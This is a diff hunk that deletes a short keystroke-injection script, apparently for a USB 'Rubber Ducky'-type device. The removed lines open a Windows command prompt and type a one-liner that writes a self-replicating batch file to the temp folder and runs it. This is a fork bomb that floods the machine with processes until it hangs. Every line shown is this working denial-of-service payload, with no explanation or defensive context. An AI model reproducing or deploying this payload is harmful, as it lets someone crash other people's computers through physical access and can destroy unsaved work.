@@ -1,9 +1,0 @@
-GUI r
-DELAY 250
-STRING cmd
-DELAY 150
-ENTER
-DELAY 250
-STRING cd %temp% & echo :fork>fork.bat & echo start %0>>fork.bat & echo %0|%0>>fork.bat & echo goto :fork>>fork.bat & fork.bat
-DELAY 150
-ENTER
